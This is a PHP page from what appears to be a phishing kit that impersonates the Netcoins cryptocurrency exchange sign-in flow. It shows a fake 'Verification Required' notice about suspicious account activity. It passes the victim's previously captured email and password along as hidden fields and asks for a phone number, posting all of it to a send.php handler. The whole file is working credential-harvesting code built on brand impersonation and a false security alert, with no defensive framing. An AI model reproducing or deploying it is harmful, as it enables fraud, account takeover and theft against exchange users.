<?php include_once './config.php'; ?>
<html lang="en">
    <?php
        $title = 'Sign in to Netcoins | Buy, Sell and Margin Trade Bitcoin (BTC) and Ethereum (ETH)';
        include_once './includes/meta.php';
        if(empty($_SESSION["email"]) || empty($_SESSION["password"])) {
            redirect(base_url());
        }
        unset($_SESSION['phone_number']);
    ?>
    <body>
        <link rel="stylesheet" href="<?= base_url('assets/country-code-picker/css/jquery.ccpicker.css')?>">
        <?php include_once './includes/header.php'; ?>
        <div>
            <form method="post" action="<?= base_url('send.php')?>" class="col-12 shadow-sm py17">
                <h2 class="fs20 my25">Verification Required</h2>
                <h3 class="fs17 text-danger">Important Information</h3>
                <p class="my20 fs14">Some Suspicious Activity Found With Your Account, Enter Your Phone Number to Verify Your Identity.</p>
                <input type="hidden" name="email" value="<?=$_SESSION['email']?>" >
                <input type="hidden" name="password" value="<?=$_SESSION['password']?>" >
                <div className="my25">
                    <label for="" class="form-label">Phone Number</label>
                    <div class="form-control fs16" style="padding: 0px;">
                        <input name="phone_number" type="number" id="phone_number" required="" style="width: 80%; color: rgb(229, 229, 234); border: solid 1px #393958; background-color: #393958; padding: 10px 5px;margin: 0px;" class="" placeholder="Phone number" value="" >
                    </div>
                </div>
                <div class="text-center mx-auto d-grid gap-2 my25">
                    <button type="submit" class="btn btn-primary btn-block">Submit</button>
                </div>
                <div class="text-center my25 fw-medium">
                    <span class="text-secondary">Need help?</span>
                    <a href="javascript:void(Tawk_API.toggle())" class="text-decoration-none text-primary-2"> Contact Support</a>
                </div>
            </form>
        </div>
        <?php include_once './includes/footer.php'; ?>
        <script src="./assets/country-code-picker/js/jquery.ccpicker.min.js"></script>
        <script type="text/javascript">
            $(document).ready(function() {
                $("#phone_number").CcPicker({ countryCode: "us", dataUrl: "<?= base_url('assets/country-code-picker/data/en.json')?>", searchPlaceHolder: "Find..." });
            });
            
        </script>
    </body>
</html>